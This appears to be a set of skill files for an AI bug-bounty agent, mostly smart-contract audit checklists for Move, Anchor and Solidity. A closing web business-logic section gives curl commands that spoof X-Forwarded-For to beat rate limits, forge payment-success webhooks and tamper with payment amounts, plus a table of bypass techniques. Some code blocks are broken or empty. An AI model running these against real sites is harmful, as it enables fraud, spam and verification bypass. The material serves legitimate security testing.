- Every assumption must have a counter-example
- Every invariant must have a test

### Persona 2: Pentester (OSCP+ Mindset)
- Primitives-based thinking: what can I control?
- Business logic focus: what does the developer believe that's false?
- Chain every primitive into an exploit

### Persona 3: Senior Dev/Architect
- Full call stack reading: not just the vulnerable function, but every caller
- Dependency chain awareness: supply chain as attack surface
- Gas optimization patterns that create security holes

### Persona 4: Cracked Generalist
- Move/Rust/Solidity/TypeScript/Kotlin/Dart fluency
- EVM/Solana/Aptos internals
- Cryptographic primitives knowledge (ECDSA, EdDSA, Poseidon, BN254)

**Output rules:** No em dashes. No hedging. Pre-answer triager objections. Every claim backed by executed code.

---

### 11-Step Pipeline
1. **Tool verification** — Check echidna/medusa installed
2. **ABI extraction** — Extract from Foundry/Hardhat artifacts
3. **Protocol understanding** — Load x-ray or fallback analyzer
4. **Entry point selection** — Interactive function picker
5. **Scaffold generation** — Basic harness structure
6. **Handler generation** — Stateful function wrappers
7. **Coverage iteration** — Run medusa, measure coverage
8. **Invariant discovery** — 5 parallel agents (protocol specialist, conservation auditor, roundtrip analyst, state-transition mapper, adversarial profit maximizer)
9. **Property synthesis** — English → Solidity assertions
10. **Fuzzing campaign** — Run with time limits
11. **Validation & reporting** — Invariant violations → findings

### 5 Invariant Discovery Agents
- **Protocol Specialist:** Understands AMM/lending/staking/bridge patterns
- **Conservation Auditor:** Checks `totalAssets == Σ(balances)`, supply invariants
- **Roundtrip/Rounding Analyst:** Tests deposit→withdraw→deposit loops for profit
- **State-Transition Mapper:** Maps all state transitions, finds unreachable states
- **Adversarial Profit Maximizer:** Tries every combination to extract value

---

## X-RAY PRE-AUDIT REPORT

When `--xray` flag is set, generate a pre-audit report before deep analysis:

### Enhanced Threat Model Components
- **Protocol-type profiling:** AMM, lending, derivatives, yield, bridge, NFT, governance
- **Git-weighted attack surfaces:** Recent commits = higher risk areas
- **Temporal risk analysis:** Code age, upgrade frequency, team turnover
- **Composability dependency mapping:** What external contracts does this depend on?

### X-Ray Output
```
x-ray/
├── overview.md          # Protocol summary, architecture
├── threat-model.md      # Enhanced threat model
├── invariants.md        # Security invariants
├── integrations.md      # External dependencies
├── tests.md             # Test coverage analysis
├── developers.md        # Git history, contributor analysis
└── entry-points.md      # All external functions
```

---

## MEME COIN / TOKEN SECURITY AUDIT

When `--meme` flag is set, run the token-specific audit module.

### 8 Token-Specific Bug Classes

| # | Bug Class | Quick Grep | Impact |
|---|-----------|------------|--------|
| 1 | Hidden Mint | `function mint\|function _mint` | Unlimited token creation |
| 2 | Honeypot | `function approve\|function transferFrom` | Tokens can't be sold |
| 3 | Fee Manipulation | `swapFee\|buyFee\|sellFee` | Dynamic fee → 99% |
| 4 | LP Drain | `removeLiquidity\|withdraw` | Developer drains liquidity |
| 5 | Bonding Curve | `curveAmount\|bondingCurve` | Price manipulation |
| 6 | Authority Retention | `mintAuthority\|freezeAuthority\|owner` | Admin keeps control |
| 7 | Fake Renounce | `renounceOwnership` | Ownership not actually renounced |
| 8 | Sandwich Amplification | `getAmountOut\|priceImpact` | MEV sandwich at scale |

### Token-2022 Extension Risks
- **Transfer hooks:** Can execute arbitrary code on every transfer
- **Permanent delegate:** Delegate can transfer any holder's tokens
- **Non-transferable:** Tokens locked forever
- **Interest-bearing:** Balance changes without transfer

---

### Storage Inventory
1. Map every `storage` variable with slot number and type
2. Identify proxy/upgradeable patterns (EIP-1967, UUPS, Transparent)
3. Check for storage collisions across upgrade boundaries

### Lost-Write Detection
Pattern: Storage-backed value copied to memory, mutated, never written back
```solidity
// VULNERABLE: balance is in storage, but local copy is mutated
function withdraw(uint amount) public {
    uint balance = balances[msg.sender]; // storage → memory
    balance -= amount;                   // memory mutation
    // balance never written back to storage!
}
```

### Attacker-Influenced Storage Slot Writes
- Check if `keccak256(key)` or user-controlled values determine storage slots
- Verify that mappings use unique, non-colliding slot positions
- Check for `assembly { sstore(...) }` with attacker-influenced keys

### Upgrade Layout Hazards
- New storage variables appended at end (not inserted in middle)
- No type changes for existing slots
- Gap slots reserved for future upgrades
- Initializer vs constructor: must use initializer for proxy patterns

---


### From `hunt-skills/bountyforge/skills/smart-contract-audit/move-checks.md`

## Sui/Move Audit Tricks

- Check every function accepting `Coin<T>` or generic `<T>` - confirm `T` is validated against a whitelist or phantom type constraint on the container; unvalidated generics are the number-one critical finding in real Move audits
- Search for `public(package) entry` or `public entry` function declarations - `entry` overrides `public(package)` visibility and makes the function callable by any transaction; internal-only functions must not carry the `entry` modifier
- Locate all struct definitions with `copy` or `drop` abilities and verify they carry no financial obligation semantics - objects with debt, flash-loan receipts, or collateral locks must have no abilities
- Verify every hot potato (flash loan receipt) struct has NO abilities (`copy`, `drop`, `store`, `key` all absent) and contains a `pool_id: ID` field binding it to the originating pool
- Check all shared objects for a `version: u64` field and verify every public function asserts `obj.version == CURRENT_VERSION`
- Inspect `init` functions and confirm no business logic assumes `init` re-runs on package upgrade - upgrades do not re-execute `init`; a migration function must exist for post-upgrade initialization
- Search `Move.toml` for git dependencies without pinned revision or tag - unpinned dependencies can change silently, importing vulnerabilities
- Verify `UpgradeCap` ownership: must be held by multi-sig, governance, or timelocked; single EOA holding it is a critical finding
- For time-sensitive operations (`clock::timestamp_ms`), check that constants have `_MS` suffix and that all comparisons use the same unit - milliseconds vs seconds confusion is a high-severity recurring bug
- In staking/reward contracts, confirm `update_rewards()` or reward accumulator update is the first operation in every stake/unstake function, before any balance change
- Check every `table::add` and `dynamic_field::add` call for a preceding `table::contains` / `dynamic_field::exists_` check - missing existence check causes DoS on duplicate entries
- For lending protocols, verify oracle price is checked for both staleness (`last_update`) and confidence interval width; accepting a stale or low-confidence price is a critical finding
- Inspect multi-return functions returning two values of the same type - verify callers destructure in the correct order; transposed return values silently corrupt all arithmetic

### Object Model and Abilities

- Struct with `copy` ability holding value-bearing semantics (token, NFT, badge)
- Struct with `drop` ability holding obligation semantics (debt record, flash loan receipt, collateral lock)
- Struct with `store` ability wrapping a sensitive capability, allowing it to be hidden or transferred outside protocol control
- Object wrapped inside a malicious contract with no guaranteed unwrap path - permanent loss
- Dynamic object field used for "hidden" objects - child ID is discoverable by indexers
- Dynamic fields not cleaned up before parent object deletion - value permanently orphaned
- `transfer::share_object` or `transfer::freeze_object` callable without capability check

### Access Control and Capabilities

- Privileged function callable without requiring a capability object (`AdminCap`, `TreasuryCap`)
- Address-based access control (`ctx.sender() == @admin`) instead of capability pattern - hardcoded address breaks on upgrade
- Capability created outside `init` without requiring an existing capability - unrestricted minting
- One-time witness (OTW) pattern absent from coin/token type creation
- Function marked `public(package) entry` when it should be callable from outside via PTB but not raw transaction - or vice versa
- Internal function declared `public` instead of `public(package)`, exposing internal logic to external callers
- Sender address accepted as a function parameter instead of derived from `tx_context::sender(ctx)`
- Generic capability `RoleCap<T>` used for authorization without asserting concrete type of `T`
- Object relationship not validated when two related objects (vault + config, position + pool) are passed together
- `Publisher` object not secured post-init - enables spoofed `Display` objects

### Package Upgrades and Lifecycle

- `init` logic depended upon to run on package upgrade - upgrades do not re-execute `init`
- Package upgrade does not re-link updated dependencies - old dependency version continues in use
- Shared object missing `version: u64` field - no mechanism to enforce "upgrade complete"
- Every public function does not check `obj.version == CURRENT_VERSION`
- Struct fields reordered or removed in upgrade - breaks deserialization of existing on-chain objects
- State migration function absent after upgrade that introduces new struct fields
- Upgrade introduces init-like function callable post-deployment to re-create capabilities
- `UpgradeCap` held by single EOA without timelock or multi-sig
- `UpgradeCap` destroyed prematurely (package immutable) before critical bugs can be fixed
- Upgrade policy more permissive than necessary (`compatible` when `dep_only` suffices)
- Git dependency in `Move.toml` without pinned revision or tag

### Shared Objects and PTBs

- Shared object mutated concurrently without version/sequence check - lost update
- Shared object used unnecessarily where owned-object pattern would prevent contention
- Flash loan hot potato has `drop` or `store` ability - borrower can discard or defer repayment
- Flash loan repay function does not validate `receipt.pool_id == object::id(pool)`
- Flash loan `start` callable multiple times in one PTB - resets snapshot, allows underpayment
- PTB flash loan enables atomic price manipulation: borrow → manipulate → exploit → repay
- Protocol has no pause mechanism - no way to halt operations on vulnerability discovery
- Pause flag not checked on all public functions - attacker routes through unpaused path
- `clock::timestamp_ms` not used for time-sensitive operations
- Time constants mix milliseconds and seconds - locks effectively instant or years-long
- Missing `deadline_ms` parameter on swap / deposit operations
- Unbounded loop or vector iteration causes gas exhaustion DoS on large state
- `table::add` or `dynamic_field::add` without preceding existence check - DoS on duplicate key

### Arithmetic and Type Safety

- Bitwise left-shift (`<<`) on financial values without explicit overflow check - Move does not check bit-shift overflow (Cetus hack vector)
- Custom math library overflow not caught by Move's default arithmetic checks
- Division before multiplication - early truncation to zero exploitable on small amounts
- Division by zero possible when divisor is user-controlled or pool state
- Integer underflow on subtraction without prior bounds check
- Narrowing cast (u128 → u64, u64 → u8) without `assert!(value <= MAX_TYPE)` bounds check
- Rounding consistently favors the user instead of the protocol - slow pool drain
- Constants contain wrong digit count (MAX_U64, SECONDS_PER_DAY, precision constants)
- Multi-return function with same-type values destructured in wrong order by callers
- Double scaling: interest index multiplication applied twice in same calculation

### Token and Coin Accounting

- `Balance<T>` and `Coin<T>` used interchangeably without consistent accounting
- First-depositor vault inflation: attacker mints 1 share then donates tokens to inflate share price
- `coin::split` or `coin::join` with internal tracking mismatch - creates or destroys value silently
- Total supply not updated atomically on every deposit/withdraw
- Zero-share mint not prevented (`assert!(shares > 0)` absent)
- Round-trip profitable: `deposit(X) → withdraw(all)` returns more than X
- Rounding direction: deposits should round DOWN (fewer shares), withdrawals should round UP (fewer tokens)
- Reward accumulator not updated before balance change - new staker earns historical rewards
- Fee collection increments a balance with no corresponding `withdraw_fees` function
- `balance::destroy_zero` called on potentially non-zero balance - permanent fund loss
- Self-transfer allowed: triggers fee/reward snapshots without economic activity

### Oracle and DeFi Protocols

- Oracle price used without staleness check (`clock_ms - oracle.last_update_ms <= MAX_STALE_MS`)
- Oracle confidence interval not validated - wide confidence means unreliable price
- Oracle object ID not validated - fake oracle accepted
- Single oracle source with no fallback or multi-source aggregation
- Spot pool price or reserve ratio used for valuation - manipulable within same PTB via flash loan
- Reference price not stored at position open time - settlement uses live price retroactively
- Slippage derived from on-chain pool state instead of user-supplied `min_amount_out`
- Liquidation bonus does not cover transaction cost for minimum-size positions
- Self-liquidation profitable (bonus exceeds penalty)
- Interest accrual continues during protocol pause - users face unexpected charges on unpause
- Bad debt not socialized - residual debt creates permanent accounting hole
- Reward accumulator updated after balance change - incorrect distribution (Thala Labs vector)
- No minimum staking duration - flash stake/unstake captures rewards in same epoch

### NFT, Kiosk, and Governance

- NFT extracted from Kiosk without completing transfer policy rules (royalties, allowlist)
- `KioskOwnerCap` not properly secured - anyone can extract NFTs
- `Display` object modifiable without Publisher - enables metadata spoofing
- Governance vote weight from current balance - flash vote possible
- Governance execution without timelock between passage and execution
- Quorum calculated from circulating supply instead of total supply
- ZK proof replay - no nullifier stored after verification
- ZK public inputs do not bind to on-chain action parameters - proof intent mismatch
- Bridge message replay - no nonce or hash deduplication

## Knowledge Base References

For detailed vulnerability patterns, read the relevant README then drill into case files:
- `cat $SKILL_DIR/reference/move/fv-mov-1-object-model/readme.md` - Abilities (copy/drop/store), dynamic fields, wrapping attacks
- `cat $SKILL_DIR/reference/move/fv-mov-2-access-control/readme.md` - Capability pattern, visibility, sender spoofing, phantom types
- `cat $SKILL_DIR/reference/move/fv-mov-3-upgrade-safety/readme.md` - init assumptions, upgrades, version checks, struct evolution
- `cat $SKILL_DIR/reference/move/fv-mov-4-shared-objects-concurrency/readme.md` - Shared objects, PTBs, hot potato, time/clock
- `cat $SKILL_DIR/reference/move/fv-mov-5-arithmetic-errors/readme.md` - Overflow, precision loss, rounding, casts, constants
- `cat $SKILL_DIR/reference/move/fv-mov-6-token-accounting/readme.md` - Coin/Balance, supply invariants, fees, dust
- `cat $SKILL_DIR/reference/move/fv-mov-8-advanced-patterns/readme.md` - Real-world exploits, generic type confusion, flash loan binding

For protocol-type-specific DeFi audit context (preconditions, historical findings, remediation):
- `cat $SKILL_DIR/reference/move/protocols/oracle.md` - Oracle patterns (Pyth on Sui, staleness, confidence, fake injection)
- `cat $SKILL_DIR/reference/move/protocols/amm-dex.md` - AMM and DEX patterns (CLMM tick arithmetic, flash swap, shared object concurrency)
- `cat $SKILL_DIR/reference/move/protocols/lending.md` - Lending patterns (vault inflation, health factor, liquidation dust, self-liquidation)
- `cat $SKILL_DIR/reference/move/protocols/staking.md` - Staking patterns (accumulator ordering, flash stake via PTB, receipt duplication, validator commission)
- `cat $SKILL_DIR/reference/move/protocols/governance.md` - Governance and bridge patterns (UpgradeCap, AdminCap, flash vote, timelock, bridge replay, ZK nullifier)


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-1-arithmetic-operations/fv-anc-1-cl5-round-trip-vault-profit-via-precision-gap.md`

## TLDR

A deposit followed by an immediate withdrawal can extract value when share-to-asset conversion rounds in the depositor's favor at both steps. When both mint and redeem paths round down at the asset level, an attacker can systematically drain dust from a vault across many round-trip transactions, particularly in low-liquidity pools or at initialization.

## Detection Heuristics

**Symmetric Rounding Favoring Depositor**
- Vault deposit computes shares as `assets / price_per_share` (truncating division) and withdrawal computes assets as `shares * price_per_share` (also truncating) without a rounding direction that favors the vault
- Neither deposit nor withdrawal applies a minimum delta fee to make round-trips economically unviable
- Test with small deposit amounts (1-10 units) to check if `assets_out >= assets_in` after an immediate withdrawal

**Share Price Manipulation via Empty Vault**
- Vault can be initialized with 0 total_supply; first depositor can manipulate the initial share price by donating tokens directly to the vault account before anyone else deposits
- `total_assets()` reads the token account balance directly rather than a stored tracked value, making it susceptible to donation inflation
- Initialization does not mint a minimum set of shares to a dead address to anchor the initial share price

**Missing Deposit or Withdrawal Fee**
- No `deposit_fee_bps` or `withdrawal_fee_bps` applied in the deposit or withdrawal paths
- Fee, if present, is set to 0 by default and not enforced at protocol level for all vault types

## False Positives

- Vault enforces a minimum deposit amount greater than the maximum rounding delta per operation
- Deposit and withdrawal fees make the round-trip economically negative for the attacker at all meaningful scales
- Vault uses the ERC-4626-equivalent virtual offset (adding 1 to total_assets and total_supply at deployment) to anchor the initial share price and prevent inflation attacks


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-6-error-handling/fv-anc-6-cl1-unclear-error-messages.md`

## TLDR

Using generic Solana `ProgramError` variants instead of custom Anchor error codes makes it impossible for clients, indexers, and auditors to determine why a transaction failed. Opaque errors also impede incident response and make it harder to distinguish security-critical rejections from benign validation failures.

## Detection Heuristics

**Generic ProgramError Variants Used for Business Logic Failures**
- `return Err(ProgramError::InvalidArgument.into())` or `return Err(ProgramError::InvalidAccountData.into())` used where a specific custom error would convey the actual condition
- `ProgramError::Custom(n)` with a numeric code and no corresponding enum variant or documentation

**Absence of #[error_code] Enum**
- Program has no `#[error_code]` enum defined, meaning all errors propagate as generic program errors
- `#[error_code]` enum exists but contains a single generic variant used for all failure cases

**Missing #[msg] Annotations**
- `#[error_code]` enum variants lack `#[msg("...")]` annotations, producing error codes without human-readable descriptions
- Error messages are present but do not describe the specific invariant that was violated

## False Positives

- `ProgramError` variants are used for infrastructure-level errors (e.g., serialization failures, account not found) where a generic error is appropriate
- Program is an internal helper with no external clients and error granularity is not operationally required


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/protocols/oracle.md`

# Oracle Integration Security Patterns

> Applies to: Pyth oracle consumers, Switchboard oracle consumers, on-chain price feeds, lending collateral pricing, margin systems, liquidation engines, perpetuals pricing, synthetic asset minting, any protocol consuming external price data on Solana

## Protocol Context

Oracle-consuming protocols on Solana are architecturally exposed to the update frequency and reliability characteristics of the specific feed they integrate. Pyth publishes confidence intervals and status flags alongside each price; Switchboard aggregates multiple sources with configurable staleness windows. Both models require the consuming program to make active decisions about what constitutes an acceptable price - staleness tolerance, confidence ratio, and status validity must be explicitly enforced on-chain at every price consumption site. Off-chain oracle manipulation is not feasible for Pyth or Switchboard, but on-chain spot price manipulation via flash loans remains a viable attack vector for protocols that derive prices from AMM pool reserves rather than dedicated oracle feeds.

### Stale Price Acceptance

**Protocol-Specific Preconditions**

- Program reads `Price.price` from a Pyth feed account without calling `try_get_price_no_older_than(clock, max_age_seconds)` or equivalent
- Switchboard feed read without checking `latest_confirmed_round.round_open_slot` against current slot
- Max staleness threshold is set to an unreasonably large value relative to the protocol's liquidation and collateral sensitivity
- Oracle account not validated against a hardcoded or governance-registered expected address, allowing submission of a different feed with a recently-updated but wrong price

**Detection Heuristics**

- Search for `get_price_unchecked()` or direct `price_account.try_deserialize()` usage without a subsequent staleness check
- Check every oracle price consumption site for a comparison of `publish_time` or `round_open_slot` against `Clock.unix_timestamp` or `Clock.slot` within an acceptable window
- Verify that the staleness window parameter is configurable and its current value is appropriate for the protocol's risk model
- Identify any oracle account passed as an instruction parameter (not hardcoded); verify it is compared against a registered expected address before use

**False Positives**

- Protocol exclusively uses `try_get_price_no_older_than` with an appropriate max age for all price consumption sites
- Feed update frequency is documented to be faster than the protocol's staleness window and this is enforced by the on-chain check

---

### Confidence Interval and Status Ignored

**Protocol-Specific Preconditions**

- `Price.conf` not validated against a maximum acceptable ratio before using `Price.price`
- `Price.status` not compared against `PriceStatus::Trading` at every consumption site; price used when status is `Unknown` or `Halted`
- No circuit breaker for extreme price deviation; a compromised or malfunctioning oracle can report any value without on-chain rejection

**Detection Heuristics**

- Grep for all `Price.price` or `price.agg.price` access sites; trace each to find whether `conf`, `status`, and `publish_time` are all validated in the same code path
- Check whether the max confidence ratio is a protocol parameter that governance can update, or a hardcoded constant; constants that are too loose cannot be tightened post-deployment
- Verify the circuit breaker logic if present: max deviation from last accepted price, minimum/maximum absolute price bounds

**False Positives**

- Protocol applies all three checks (staleness, confidence ratio, status) before every price use and returns a descriptive error on violation
- Confidence ratio check applies a reasonable bound (e.g., reject if `conf * 100 / abs(price) > 2`) for the asset class being priced

---

### Flash Loan Oracle Manipulation

**Protocol-Specific Preconditions**

- Price derived from AMM pool reserves (`token_a_reserve / token_b_reserve`) rather than a dedicated oracle feed
- Protocol integrates with a flash loan provider and the flash loan target pool is the same pool used for price derivation
- No TWAP or multi-block price averaging; price reflects instantaneous reserve ratio at instruction execution time

**Detection Heuristics**

- Identify all price or exchange rate computation sites; check whether the rate is derived from on-chain pool reserves or from a dedicated oracle account
- For protocols using pool-derived prices, verify whether the protocol also integrates a TWAP oracle account from the same pool that uses a historical average
- Check for minimum time between price-sensitive operations that would prevent rapid manipulation within a single slot

**False Positives**

- Protocol uses only off-chain aggregated oracle feeds (Pyth, Switchboard) that cannot be manipulated via on-chain flash loans
- AMM TWAP oracle used with a sufficiently long window (e.g., 30 minutes) that a single-block flash loan cannot meaningfully move the time-weighted average

---

### Fake Oracle Injection (ref: fv-anc-8-cl3)

**Protocol-Specific Preconditions**

- Oracle account passed as an instruction parameter and validated only by checking it is non-zero or owned by a known oracle program, not by comparing its address to an expected feed address
- Multiple oracles supported but the registry of accepted oracle addresses is not enforced on-chain at the price consumption site
- Program ID check performed on the oracle account (Pyth program, Switchboard program) but not the specific feed address within that program

**Detection Heuristics**

- Find every instruction that accepts an oracle or price feed account as a parameter; check whether it is compared against a hardcoded constant or a governance-stored expected address
- Verify that oracle address registration is gated behind a privileged admin or governance instruction, not freely settable by users
- Check for Anchor `#[account(address = expected_oracle_address)]` constraint or equivalent manual key comparison

**False Positives**

- Oracle accounts are hardcoded as program constants and not accepted as instruction parameters
- Protocol uses a governance-managed oracle registry with a privileged update path; any oracle address used must first be registered by governance

---

### Retroactive or Delayed Price Application

**Protocol-Specific Preconditions**

- Signed price updates submitted via durable nonce transactions can be submitted at any future time at the submitter's convenience
- Protocol allows price updates to be applied to positions that were opened before the price update's timestamp
- Settlement or liquidation can use a price snapshot from a previous slot rather than the current slot price

**Detection Heuristics**

- Check whether price update instructions validate that the price timestamp is strictly later than the position's open timestamp
- Verify that settlement prices are bounded to a freshness window relative to the settlement execution time, not just relative to when the price was published
- Identify any signed-price or voucher mechanism (price attested off-chain and submitted on-chain); check that the on-chain consumer enforces an expiry window

**False Positives**

- Protocol only applies oracle prices at the current slot; no mechanism exists to submit past prices for current operations
- Settlement price must be within a tight freshness window (e.g., 5 seconds) relative to the settlement transaction's Clock.unix_timestamp


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/move/fv-mov-4-shared-objects-concurrency/fv-mov-4-cl3-ptb-price-manipulation.md`

## TLDR

Sui PTBs allow up to 1024 operations in one atomic transaction. An attacker can compose: (1) borrow via flash loan, (2) manipulate an on-chain price oracle or pool reserve ratio, (3) call the vulnerable function at the manipulated price, (4) repay the flash loan - all within a single transaction. This is the Sui-native equivalent of the flash loan attack vector.

## Detection Heuristics

- Identify all price or valuation sources - are they derived from on-chain pool reserve ratios or spot prices? Those are manipulable within a single PTB
- Check whether any critical operation (collateral valuation, swap execution, liquidation trigger) reads price from the same pool that could be atomically manipulated in the same transaction
- Verify that borrow-then-use-same-pool-price paths exist - if so, TWAP or external oracle is required
- Look for missing `min_amount_out` slippage protection - no user-supplied minimum enables sandwich attacks
- Check for `deadline_ms` parameter on all swap and liquidity operations

## False Positives

- All price feeds use TWAP or external oracle (Pyth, Switchboard) that cannot be manipulated within a single transaction
- Slippage protection from user calldata (`min_amount_out`) present on all swap functions
- Deviation check between oracle price and pool price blocks manipulation


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/move/fv-mov-6-token-accounting/fv-mov-6-cl1-coin-balance-confusion.md`

## TLDR

Sui separates `Coin<T>` (an object with a UID, transferable) from `Balance<T>` (an internal primitive value without an object ID). Mixing these without consistent accounting creates ghost balances - coins exist on-chain with no internal tracking, or internal counters exceed actual coins held.

## Detection Heuristics

- Search for `coin::into_balance` and `coin::from_balance` conversion points - verify internal state is updated at every conversion
- Check whether the protocol ever reads its own `Coin<T>` balance using `coin::value` or `balance::value` on an internally held coin - if an external `coin::join` to the vault's coin changes its balance, reward calculations may be manipulable
- Verify vault accounting uses an internal `Balance<T>` field in a shared object, not the raw on-chain coin balance (which is manipulable by direct transfer)
- Trace `coin::split` calls - verify the sum of the two resulting coins equals the input; internal accounting must track both halves
- For protocols with multiple asset pools, check that `Balance<USDC>` cannot be credited to a `USDT` pool due to missing phantom type checks

## False Positives

- Clear separation enforced: `Balance<T>` for internal state, `Coin<T>` for user-facing I/O only
- `coin::into_balance` / `coin::from_balance` used consistently with no direct coin balance reads for business logic
- Invariant: sum of all internal `Balance<T>` equals actual on-chain token holdings, verified by tests


### From `hunt-skills/hunt-business-logic/SKILL.md`

## Crown Jewel Targets

Business logic vulnerabilities pay highest in platforms where financial transactions, identity verification, and access controls intersect with real-world consequences. The richest targets are:

- **E-commerce & payment platforms** (Valve/Steam, Shopify) — payment flow manipulation, free goods, price tampering
- **Marketplace & gig economy apps** (Airbnb, Uber) — identity/verification bypass enabling fraud or unsafe interactions
- **SaaS with tiered access** (Mozilla Monitor) — bypassing verification to unlock monitoring features without entitlement
- **High-traffic consumer apps** (Snapchat, Yelp) — rate-limit bypass enabling spam, enumeration, or abuse at scale

Asset types that pay: checkout flows, subscription endpoints, callback/verification systems, webhook handlers, employee/internal portals exposed to the internet, and any endpoint that trusts client-supplied data to make authorization decisions.

---

## Attack Surface Signals

**URL patterns to watch:**
- `/checkout`, `/order`, `/subscribe`, `/payment`, `/verify`, `/confirm`, `/callback`
- `/internal`, `/employee`, `/summit`, `/staff`, `/admin` — internal pages accidentally public
- `/api/v*/payment`, `/api/v*/notify`, `/webhook` — payment provider callbacks
- Endpoints accepting `X-Forwarded-For`, `X-Real-IP`, `CF-Connecting-IP` headers

**Response/header signals:**
- `Set-Cookie` with unvalidated session state tied to cart or order data
- Payment provider names in responses: `Smart2Pay`, `Stripe`, `PayPal`, `Braintree`
- Redirect chains through third-party payment pages (in-flight data opportunity)
- `200 OK` on subscription/verification endpoints with no CAPTCHA or token

**JS patterns:**
- Hardcoded internal URLs in frontend bundles (`/employee/`, `/staff/`, `/internal/`)
- Client-side price calculation before server submission
- Verification logic that only checks on the frontend (`if (verified) { ... }`)
- `fetch('/api/subscribe', { method: 'POST', body: ... })` with no anti-CSRF token or rate-limit token

**Tech stack signals:**
- Shopify storefronts with draft/unpublished channel pages
- Apps using IP-based rate limiting without session/account binding
- Payment webhooks with no HMAC signature validation
- SMS/phone callback flows that don't verify ownership before enabling features

---

## Step-by-Step Hunting Methodology

1. **Map all authentication boundaries.** Spider the target. Identify pages/endpoints that serve authenticated content (employee portals, premium features, order pages) and test each unauthenticated. Look for internal pages indexed in JS bundles or linked from robots.txt/sitemap.xml.

2. **Identify every verification flow.** Enumerate: email verification, phone/SMS verification, payment verification, CAPTCHA, age gates. For each, test: what happens if you skip the verification step entirely? What happens if you replay a valid token on a different account?

3. **Test rate-limiting controls on every form.** For every POST endpoint (subscribe, login, OTP, search), send 50+ rapid requests. Vary: remove cookies, rotate `X-Forwarded-For` / `X-Real-IP` headers, change `User-Agent`. Check if the server uses IP from headers rather than connection IP.

4. **Intercept and tamper with payment flows.** Use Burp Suite to intercept every request between your browser, the application, and the payment provider. Identify where price, currency, order ID, or status fields are set. Attempt to modify amounts to $0.01 or currency to a low-value currency. Look for POST-back/webhook endpoints that accept payment confirmation — test if they validate HMAC/signature.

5. **Test phone/callback number verification.** Whenever a platform accepts a callback number, test: can you set it to a number you don't own? Does the platform call/text that number and grant trust based solely on submission? Try setting it to a victim's number.

6. **Check for unprotected employee/internal surfaces.** Search Shodan, GitHub, JS bundles, and Wayback Machine for internal subdomain/path references. Test access without authentication. Check if these surfaces allow order placement, data access, or privilege escalation.

7. **Validate business impact.** For each finding, determine: does this result in financial loss, unauthorized access, or data exposure? Document the end-to-end chain.

---

# Rotate X-Forwarded-For to bypass IP rate limiting
for i in $(seq 1 100); do
  curl -s -X POST https://target.com/api/subscribe \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -H "X-Real-IP: 10.0.0.$i" \
    -H "Content-Type: application/json" \
    -d '{"email":"victim+'"$i"'@example.com"}' \
    -o /dev/null -w "%{http_code}\n"
done
```

**Payment tampering — modify in-flight price:**
```http
POST /payment/initiate HTTP/1.1
Host: target.com

amount=0.01&currency=USD&order_id=12345&product_id=99
```
```bash

# Look for unvalidated webhook endpoints
curl -X POST https://target.com/payment/callback \
  -H "Content-Type: application/json" \
  -d '{"status":"success","amount":"0.01","order_id":"12345","transaction_id":"fake-txn"}'
```

**Unauthenticated internal page discovery:**
```bash

# Grep JS bundles for internal paths
curl -s https://target.com/assets/app.js | grep -oE '"/[a-zA-Z0-9/_-]{3,50}"' | sort -u
```

**Email verification bypass:**
```bash

## Common Root Causes

1. **Server trusts client-supplied data for financial decisions.** Developers offload price calculation to the frontend or pass amount fields through forms/URLs without re-validating on the server against a canonical source (the product database).

2. **Verification is enforced only in the UI, not the API.** Frontend hides features behind a verification gate, but the backend API endpoints are fully functional without a verified status — any authenticated request succeeds.

3. **IP-based rate limiting reads from spoofable headers.** Developers implement rate limits using `request.headers['X-Forwarded-For']` instead of the actual connection IP, allowing trivial bypass by header manipulation.

4. **Payment webhooks lack signature validation.** Developers implement "success" webhooks without verifying the HMAC signature provided by the payment provider, allowing anyone to POST a fake success notification.

5. **Internal/employee pages aren't access-controlled.** Internal tools are deployed to production domains without authentication middleware, either because developers assume obscurity (unlisted URL) or forgot to apply auth to a new route.

6. **Phone/callback verification is advisory, not enforced.** Systems accept a phone number and grant trust to whoever submitted it, without confirming the submitter owns or controls that number.

7. **Draft/channel-specific storefronts inherit full order functionality.** Platforms like Shopify allow creating storefronts for specific channels (employee events) that are unlisted but still fully functional for order placement if the URL is known.

---

## Bypass Techniques

| Defense | Bypass |
|---|---|
| IP-based rate limiting | Rotate `X-Forwarded-For`, `X-Real-IP`, `True-Client-IP`, `CF-Connecting-IP` headers per request |
| CAPTCHA on subscription forms | Use header-based bypass first; if CAPTCHA is only on the web form, call the underlying API endpoint directly |
| Email verification gate | Access the post-verification API endpoint directly; replay valid tokens; check if `verified=true` is a client-set cookie/param |
| Payment amount server validation | Modify currency to a lower-value currency; test with $0.00 or negative amounts; manipulate order IDs to reference different products |
| Webhook HMAC validation | Test with no/empty signature header (is validation enforced at all — a modified payload only "passes" if it isn't); replay an UNMODIFIED captured webhook to test missing idempotency/anti-replay |
| Auth on internal pages | Try unauthenticated; try with a low-privilege account; try path traversal variants (`/employee/../employee/`) |
| Phone verification (OTP sent) | Submit someone else's number without OTP validation; check if the system grants trust on submission vs. OTP confirmation |

---

## Gate 0 Validation

Before writing any report, answer all three:

1. **What can the attacker DO right now?**
   Be specific: "An unauthenticated user can place an order for physical goods at $0 cost" or "An attacker can bypass email verification and monitor any email address without owning it" or "An attacker can send unlimited subscription emails to any address." Vague impact = reject.

2. **What does the victim LOSE?**
   Identify a concrete, attributable loss: financial loss (free goods, fraudulent payments), privacy loss (phone number spoofed, unauthorized monitoring), service abuse (spam campaigns via rate-limit bypass), or security degradation (unverified identity trusted for sensitive actions). If the loss is purely theoretical, re-evaluate severity.

3. **Can it be reproduced in 10 minutes from scratch?**
   Create a fresh account (or use no account). Follow your documented steps. Achieve the impact. If you can't reliably reproduce it end-to-end in under 10 minutes with the steps you've written, your methodology is incomplete — refine before submitting.

---

## Real Impact Examples

**Scenario 1 — Free Physical Goods via Exposed Internal Storefront (Shopify-style)**
An employee summit page was deployed to a public Shopify storefront as a private channel for distributing free books to staff. The URL was discoverable via JS bundle analysis or link sharing. An anonymous user who navigated to the URL could browse and complete a checkout with no authentication required, receiving physical merchandise shipped at the company's expense. Impact: direct financial loss per order, potential for bulk ordering if not caught quickly.

**Scenario 2 — Payment Manipulation via In-Flight Tampering (Valve/Steam-style)**
